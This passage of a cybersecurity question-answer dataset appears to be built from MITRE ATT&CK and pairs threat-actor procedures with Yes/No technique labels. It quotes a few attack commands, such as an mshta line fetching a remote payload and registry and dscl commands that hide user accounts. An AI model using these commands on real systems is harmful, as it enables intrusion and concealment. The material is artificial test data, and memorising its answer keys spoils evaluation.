      "background": "Scheduled Task/Job: Scheduled Task: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
      "question": "Is procedure NotPetya creates a task to reboot the system one hour after infection. a type of technique Scheduled Task/Job: Scheduled Task",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Lizar can collect email accounts from Microsoft Outlook and Mozilla Thunderbird. a type of technique Data from Network Shared Drive.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Account Discovery: Email Account: Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",
      "question": "Is procedure Lizar can collect email accounts from Microsoft Outlook and Mozilla Thunderbird. a type of technique Data from Network Shared Drive",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure BackdoorDiplomacy has executed DLL search order hijacking. a type of technique Inhibit System Recovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Hijack Execution Flow: DLL Search Order Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Hijack Execution Flow: DLL Search Order Hijacking: Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
      "question": "Is procedure BackdoorDiplomacy has executed DLL search order hijacking. a type of technique Inhibit System Recovery",
      "yes/no": "No.\nThe correct answer is Hijack Execution Flow: DLL Search Order Hijacking",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure SMOKEDHAM has used <code>whoami</code> commands to identify system owners.  related to technique System Owner/User Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Owner/User Discovery: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "question": "Is procedure SMOKEDHAM has used <code>whoami</code> commands to identify system owners.  related to technique System Owner/User Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Hide Artifacts: Hidden Users: Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user\u2019s home folder by changing the <code>chflags</code> to hidden. \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>). Display Managers are not anchored to specific distributions and may be changed by a user or adversary..\nAnswer in Yes or No.\n\nQuestion: Is procedure Kimsuky has run <code>reg add \u2018HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\u2019 /v</code> to hide a newly created user.  related to technique Hide Artifacts: Hidden Users",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Hide Artifacts: Hidden Users: Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file. Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user\u2019s home folder by changing the <code>chflags</code> to hidden. \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>). Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
      "question": "Is procedure Kimsuky has run <code>reg add \u2018HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\u2019 /v</code> to hide a newly created user.  related to technique Hide Artifacts: Hidden Users",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.  related to technique Obfuscated Files or Information: Steganography",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Steganography: Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.",
      "question": "Is procedure MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.  related to technique Obfuscated Files or Information: Steganography",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Dragonfly has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil). a type of technique Screen Capture.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Screen Capture: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
      "question": "Is procedure Dragonfly has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil). a type of technique Screen Capture",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications..\nQ: Is procedure The Regin malware platform can use ICMP to communicate between infected computers.  related to technique Encrypted Channel.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "question": "Is procedure The Regin malware platform can use ICMP to communicate between infected computers.  related to technique Encrypted Channel",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Masquerading: Match Legitimate Name or Location: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic..\nQ: Is procedure Silence has named its backdoor \"WINWORD.exe\". a type of technique Masquerading: Match Legitimate Name or Location.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Masquerading: Match Legitimate Name or Location: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "question": "Is procedure Silence has named its backdoor \"WINWORD.exe\". a type of technique Masquerading: Match Legitimate Name or Location",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server.  related to technique System Binary Proxy Execution: Mshta.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Binary Proxy Execution: Mshta: Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http://webserver/payload.hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",
      "question": "Is procedure Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server.  related to technique System Binary Proxy Execution: Mshta",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Remote System Discovery: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>)..\nAnswer in Yes or No.\n\nQuestion: Is procedure TrickBot can enumerate computers and network devices. a type of technique User Execution: Malicious Link",
    "context": "",
    "output": "No.\nThe provided context is correlated with Remote System Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Remote System Discovery: Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).",
      "question": "Is procedure TrickBot can enumerate computers and network devices. a type of technique User Execution: Malicious Link",
      "yes/no": "No.\nThe provided context is correlated with Remote System Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Indicator Removal: Timestomp: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools..\nAnswer in Yes or No.\n\nQuestion: Is procedure China Chopper's server component can change the timestamp of files.  related to technique Obfuscated Files or Information",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: Timestomp: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
      "question": "Is procedure China Chopper's server component can change the timestamp of files.  related to technique Obfuscated Files or Information",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Deobfuscate/Decode Files or Information: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary..\nAnswer in Yes or No.\n\nQuestion: Is procedure Remexi decrypts the configuration data using XOR with 25-character keys.  related to technique Deobfuscate/Decode Files or Information",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Deobfuscate/Decode Files or Information: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "question": "Is procedure Remexi decrypts the configuration data using XOR with 25-character keys.  related to technique Deobfuscate/Decode Files or Information",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Process Discovery: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes..\nAnswer in Yes or No.\n\nQuestion: Is procedure SYSCON has the ability to use Tasklist to list running processes. a type of technique Process Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Process Discovery: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "question": "Is procedure SYSCON has the ability to use Tasklist to list running processes. a type of technique Process Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Drive-by Compromise: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites..\nQ: Is procedure KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.  related to technique Drive-by Compromise.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Drive-by Compromise: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",
      "question": "Is procedure KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.  related to technique Drive-by Compromise",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel..\nAnswer in Yes or No.\n\nQuestion: Is procedure The Maze encryption process has used batch scripts with various commands.  related to technique System Service Discovery",
    "context": "",
    "output": "No.\nThe correct answer is Command and Scripting Interpreter: Windows Command Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure The Maze encryption process has used batch scripts with various commands.  related to technique System Service Discovery",
      "yes/no": "No.\nThe correct answer is Command and Scripting Interpreter: Windows Command Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure DarkTortilla can check for internet connectivity by issuing HTTP GET requests.  related to technique System Services: Service Execution.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Configuration Discovery: Internet Connection Discovery: Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
      "question": "Is procedure DarkTortilla can check for internet connectivity by issuing HTTP GET requests.  related to technique System Services: Service Execution",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Exploitation for Privilege Escalation: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own 